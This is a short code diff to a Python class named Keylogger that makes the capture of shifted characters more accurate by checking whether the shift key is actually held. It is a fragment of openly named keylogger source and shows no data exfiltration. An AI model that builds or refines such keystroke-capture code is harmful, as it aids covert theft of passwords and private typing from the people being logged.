@@ -109,9 +109,14 @@ class Keylogger:
                     self.__lock.release()
                     continue
                 elif event.name in SHIFT_MODIFIER_TABLE.keys():
-                    self.__lock.acquire()
-                    self.__keylog += SHIFT_MODIFIER_TABLE[event.name]
-                    self.__lock.release()
+                    if keyboard.is_pressed("shift"):
+                        self.__lock.acquire()
+                        self.__keylog += SHIFT_MODIFIER_TABLE[event.name]
+                        self.__lock.release()
+                    else:
+                        self.__lock.acquire()
+                        self.__keylog += event.name
+                        self.__lock.release()
                     continue
                 else:
                     self.__lock.acquire()
